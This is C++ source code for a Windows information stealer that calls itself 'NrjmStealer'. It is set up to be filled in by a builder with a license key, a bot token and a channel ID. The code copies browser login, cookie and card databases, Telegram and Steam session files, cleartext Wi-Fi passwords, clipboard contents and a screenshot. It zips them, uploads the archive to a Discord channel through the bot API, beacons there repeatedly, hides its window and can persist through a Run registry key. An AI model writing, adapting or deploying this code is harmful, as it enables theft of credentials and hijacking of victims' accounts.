#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <filesystem>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

// Secure Configuration - Values injected by Builder
const std::string LICENSE_KEY = "{{LICENSE_KEY}}";
const std::string BOT_TOKEN = "{{BOT_TOKEN}}";
const std::string CHANNEL_ID = "{{CHANNEL_ID}}";

// Secure Configuration
const std::string LICENSE_KEY = "{{LICENSE_KEY}}";
const std::string BOT_TOKEN = "{{BOT_TOKEN}}";
const std::string CHANNEL_ID = "{{CHANNEL_ID}}";
const std::string BOUNDARY = "---------------------------1234567890123456789012";

// Helper Prototypes
std::string GetEnvVar(std::string var);
void RunCommand(std::string cmd);
bool UploadFile(std::string filePath);
void Harvest();
// Restored Prototypes
std::string GetHardwareID();
std::string GetComputerName();
std::string GetPublicIP();
std::string GetOSVersion();
bool SendCheckin();
void InstallPersistence();

// --- STEALER MODULE ---
class Stealer {
public:
    static std::string harvestDir;

    static void Init() {
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        harvestDir = std::string(tempPath) + "NrjmHarvest_" + GetHardwareID();
        CreateDirectoryA(harvestDir.c_str(), NULL);
    }

    static void GrabSystemInfo() {
        std::string infoPath = harvestDir + "\\system_info.txt";
        std::string cmd = "systeminfo > \"" + infoPath + "\"";
        RunCommand(cmd);
        
        // Wifi Passwords
        RunCommand("netsh wlan export profile key=clear folder=\"" + harvestDir + "\"");
        
        // Process List
        RunCommand("tasklist > \"" + harvestDir + "\\processes.txt\"");
        
        // Clipboard
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData) {
                char* pszText = static_cast<char*>(GlobalLock(hData));
                if (pszText) {
                    std::ofstream out(harvestDir + "\\clipboard.txt");
                    out << pszText;
                    out.close();
                    GlobalUnlock(hData);
                }
            }
            CloseClipboard();
        }
    }

    static void GrabScreenshot() {
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, w, h);
        SelectObject(hdcMem, hBitmap);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

        // Save BMP (Simplified) - Requires GDI+ or manually writing headers. 
        // For zero-dependency simplicity, we will use a PowerShell one-liner or simple header write.
        // Let's write the BMP header manually.
        BITMAP bmpScreen;
        GetObject(hBitmap, sizeof(BITMAP), &bmpScreen);
        BITMAPFILEHEADER bmfHeader;
        BITMAPINFOHEADER bi;
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = bmpScreen.bmWidth;
        bi.biHeight = bmpScreen.bmHeight;
        bi.biPlanes = 1;
        bi.biBitCount = 32;
        bi.biCompression = BI_RGB;
        bi.biSizeImage = 0;
        bi.biXPelsPerMeter = 0;
        bi.biYPelsPerMeter = 0;
        bi.biClrUsed = 0;
        bi.biClrImportant = 0;
        DWORD dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
        HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
        char* lpbitmap = (char*)GlobalLock(hDIB);
        GetDIBits(hdcScreen, hBitmap, 0, (UINT)bmpScreen.bmHeight, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

        std::ofstream file(harvestDir + "\\screenshot.bmp", std::ios::binary);
        if (file) {
            bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
            bmfHeader.bfSize = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
            bmfHeader.bfType = 0x4D42; // BM
            file.write((char*)&bmfHeader, sizeof(BITMAPFILEHEADER));
            file.write((char*)&bi, sizeof(BITMAPINFOHEADER));
            file.write(lpbitmap, dwBmpSize);
        }
        GlobalUnlock(hDIB);
        GlobalFree(hDIB);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
    }

    static void CopyBrowserFiles(std::string browserName, std::string path) {
        std::string dest = harvestDir + "\\Browsers\\" + browserName;
        std::string cmd = "xcopy \"" + path + "\\Login Data\" \"" + dest + "\" /I /Y /C /Q >nul 2>&1";
        RunCommand(cmd);
        RunCommand("xcopy \"" + path + "\\Local State\" \"" + dest + "\" /I /Y /C /Q >nul 2>&1");
        RunCommand("xcopy \"" + path + "\\Cookies\" \"" + dest + "\" /I /Y /C /Q >nul 2>&1");
        RunCommand("xcopy \"" + path + "\\Web Data\" \"" + dest + "\" /I /Y /C /Q >nul 2>&1");
    }

    static void GrabBrowsers() {
        std::string local = GetEnvVar("LOCALAPPDATA");
        std::string app = GetEnvVar("APPDATA");
        
        CreateDirectoryA((harvestDir + "\\Browsers").c_str(), NULL);
        
        CopyBrowserFiles("Chrome", local + "\\Google\\Chrome\\User Data\\Default");
        CopyBrowserFiles("Edge", local + "\\Microsoft\\Edge\\User Data\\Default");
        CopyBrowserFiles("Brave", local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
        CopyBrowserFiles("Opera", app + "\\Opera Software\\Opera Stable");
        CopyBrowserFiles("Yandex", local + "\\Yandex\\YandexBrowser\\User Data\\Default");
    }

    static void GrabSessions() {
        std::string app = GetEnvVar("APPDATA");
        
        // Telegram
        std::string tdata = app + "\\Telegram Desktop\\tdata";
        if (GetFileAttributesA(tdata.c_str()) != INVALID_FILE_ATTRIBUTES) {
            std::string dest = harvestDir + "\\Telegram";
            CreateDirectoryA(dest.c_str(), NULL);
            // Grab key files only to save space/time
            RunCommand("xcopy \"" + tdata + "\\D8*\" \"" + dest + "\" /Y /C /Q >nul 2>&1");
            RunCommand("xcopy \"" + tdata + "\\key_datas\" \"" + dest + "\" /Y /C /Q >nul 2>&1");
        }

        // Steam
        std::string steam = "C:\\Program Files (x86)\\Steam";
        std::string destSteam = harvestDir + "\\Steam";
        CreateDirectoryA(destSteam.c_str(), NULL);
        RunCommand("xcopy \"" + steam + "\\config\\loginusers.vdf\" \"" + destSteam + "\" /Y /C /Q >nul 2>&1");
        RunCommand("xcopy \"" + steam + "\\ssfn*\" \"" + destSteam + "\" /Y /C /Q >nul 2>&1");

        // Minecraft
        std::string mc = app + "\\.minecraft\\launcher_profiles.json";
        if (GetFileAttributesA(mc.c_str()) != INVALID_FILE_ATTRIBUTES) {
             CopyFileA(mc.c_str(), (harvestDir + "\\minecraft_profiles.json").c_str(), FALSE);
        }
    }
};

std::string Stealer::harvestDir = "";

// ... Helper Implementations ...
std::string GetEnvVar(std::string var) {
    char buf[MAX_PATH];
    if (GetEnvironmentVariableA(var.c_str(), buf, MAX_PATH) > 0) return std::string(buf);
    return "";
}

void RunCommand(std::string cmd) {
    system(cmd.c_str());
}

bool UploadFile(std::string filePath) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) return false;
    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    std::string filename = filePath.substr(filePath.find_last_of("\\/") + 1);

    std::string headers = "Content-Type: multipart/form-data; boundary=" + BOUNDARY;
    std::string body = "--" + BOUNDARY + "\r\n";
    body += "Content-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\n";
    body += "Content-Type: application/zip\r\n\r\n"; // Assuming zip for now
    body += content;
    body += "\r\n--" + BOUNDARY + "--\r\n";

    HINTERNET hSession = InternetOpenA("NrjmStealer", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hConnect = InternetConnectA(hSession, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", ("/api/v10/channels/" + CHANNEL_ID + "/messages").c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    
    std::string auth = "Bot " + BOT_TOKEN;
    HttpAddRequestHeadersA(hRequest, ("Authorization: " + auth).c_str(), -1, HTTP_ADDREQ_FLAG_ADD);
    HttpAddRequestHeadersA(hRequest, headers.c_str(), -1, HTTP_ADDREQ_FLAG_ADD);

    bool result = HttpSendRequestA(hRequest, NULL, 0, (LPVOID)body.c_str(), (DWORD)body.length());
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
    return result;
}

void Harvest() {
    Stealer::Init();
    std::cout << "[INFO] Harvesting Data..." << std::endl;
    
    Stealer::GrabSystemInfo();     // Wifi, Procs, Clipboard
    Stealer::GrabScreenshot();     // Desktop
    Stealer::GrabBrowsers();       // Chrome, Edge...
    Stealer::GrabSessions();       // Telegram, Steam, Minecraft
    
    // Bundle with TAR (Windows 10+)
    std::string zipPath = Stealer::harvestDir + ".zip";
    // Command: tar -cf "C:\Temp\Harvest.zip" -C "C:\Temp" "NrjmHarvest_ID"
    std::string cmd = "tar -cf \"" + zipPath + "\" -C \"" + GetEnvVar("TEMP") + "\" \"NrjmHarvest_" + GetHardwareID() + "\"";
    RunCommand(cmd);
    
    // Upload
    std::cout << "[INFO] Uploading Harvest..." << std::endl;
    UploadFile(zipPath);
    
    // Cleanup
    RunCommand("rmdir /s /q \"" + Stealer::harvestDir + "\"");
    DeleteFileA(zipPath.c_str());
}

// --- Restored Helper Implementations ---
std::string GetComputerName() {
    char buffer[256];
    DWORD size = sizeof(buffer);
    if (GetComputerNameA(buffer, &size)) return std::string(buffer);
    return "Unknown";
}

std::string GetHardwareID() {
    char volumeName[MAX_PATH + 1] = { 0 };
    DWORD serialNumber = 0;
    if (GetVolumeInformationA("C:\\", volumeName, sizeof(volumeName), &serialNumber, NULL, NULL, NULL, 0)) {
        std::stringstream ss;
        ss << std::hex << serialNumber;
        return ss.str();
    }
    return "Unknown";
}

std::string GetPublicIP() {
    HINTERNET hNet = InternetOpenA("NrjmWitchClient", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hNet) return "127.0.0.1";
    HINTERNET hFile = InternetOpenUrlA(hNet, "http://api.ipify.org", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) { InternetCloseHandle(hNet); return "127.0.0.1"; }
    char buffer[1024]; DWORD bytesRead; std::string ip;
    while (InternetReadFile(hFile, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) { buffer[bytesRead] = 0; ip += buffer; }
    InternetCloseHandle(hFile); InternetCloseHandle(hNet);
    if (ip.length() < 7 || ip.length() > 15) return "127.0.0.1";
    return ip;
}

std::string GetOSVersion() { return "Windows"; }

bool SendCheckin() {
    std::string hwid = GetHardwareID();
    std::string ip = GetPublicIP();
    std::string pcName = GetComputerName();
    std::string os = GetOSVersion();
    std::string message = "!checkin " + LICENSE_KEY + " " + hwid + " " + ip + " " + pcName + " " + os;
    std::string jsonPayload = "{\"content\":\"" + message + "\"}";
    HINTERNET hSession = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", 0, NULL, NULL, 0); 
    if (!hSession) return false;
    HINTERNET hConnect = InternetConnectA(hSession, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hSession); return false; }
    std::string path = "/api/v10/channels/" + CHANNEL_ID + "/messages";
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (hRequest) {
        std::string headers = "Authorization: Bot " + BOT_TOKEN + "\r\nContent-Type: application/json";
        HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)jsonPayload.c_str(), (DWORD)jsonPayload.length());
        InternetCloseHandle(hRequest);
    }
    InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
    return true;
}

void InstallPersistence() {
    HKEY hKey;
    const char* czKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegOpenKeyExA(HKEY_CURRENT_USER, czKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        RegSetValueExA(hKey, "NrjmWitchClient", 0, REG_SZ, (const BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
}

int main() {
    #ifndef _DEBUG
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    #endif

    #ifdef USE_PERSISTENCE
    InstallPersistence();
    #endif

    // Initial checkin
    SendCheckin(); 

    // Run Stealer ONCE at startup
    Harvest();

    while (true) {
        Sleep(30000); 
        SendCheckin();
    }
    return 0;
}